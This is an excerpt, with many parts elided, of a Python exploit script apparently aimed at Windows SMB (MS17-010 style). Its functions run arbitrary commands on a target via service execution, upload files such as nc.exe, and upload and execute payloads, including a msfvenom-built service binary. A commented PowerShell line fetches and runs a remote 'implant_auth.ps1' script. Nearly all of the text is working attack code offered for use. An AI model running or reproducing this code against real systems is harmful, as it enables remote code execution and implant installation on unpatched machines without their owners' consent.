...
def exploit(target, pipe_name, command='', source='', dest='', drive='C', option='command'):
    conn = MYSMB(target)
    ...
    # ================================
    try:
        if option == 'command' and command != '':
            smb_pwn(conn, command)
        elif source != '' and dest != '':
            if option == 'put_file':
                send_file(conn, source, drive, dest)
            elif option == 'upload_execute_file':
                smb_pwn_file(conn, info['arch'], source, dest)
    except:
        pass
...
def smb_pwn(conn, command):
    smbConn = conn.get_smbconnection()
    print("running command %s" % command)
    service_exec(smbConn, command)


def smb_pwn_file(conn, arch, source, dest):
    smbConn = conn.get_smbconnection()
    print("uploading file %s to %s" % (source, dest))
    smb_send_file(smbConn, source, 'C', '/%s' % dest.replace('\\', '/'))
    print("executing file %s" % dest)
    service_exec(smbConn, 'cmd /c C:%s' % dest.replace('/', '\\'))
    # executing binary generated by "msfvenom -f exe-service ..."


def send_file(conn, localSrc, remoteDrive='C', remotePath='/'):
    smbConn = conn.get_smbconnection()
    smb_send_file(smbConn, localSrc, remoteDrive, remotePath)
...
- Windows 2000 SP4 x86
'''
    # r"cmd /c powershell -exec bypass -c iex (new-object system.net.webclient).downloadstring('https://<URL>/implant_auth.ps1')"
    ...
    try:
        ...
        parser.add_argument('-uploaddst', default='', action='store', help='Destination to upload to C:\\nc.exe (optional)')
        parser.add_argument('-executeupload', default='', action='store', help='Execute after upload (optional)')
        parser.add_argument('-command', default='', action='store', help='Command to execute')
        ...
        if options.command != '':
        ...
        elif options.uploadsrc != '' and options.uploaddst != '':
                drive, dest = options.uploaddst.split(':')[0], options.uploaddst.split(':')[1]
                if options.executeupload != '':
                        exploit(
                                ...
                                command=options.command,
                                drive=drive,
                                source=options.uploadsrc,
                                dest=dest,
                                option='upload_execute_file'
                        )
                else:
                        exploit(
                                target=options.target,
        ...
        sys.stderr.write('Error in main: %s' % str(err))
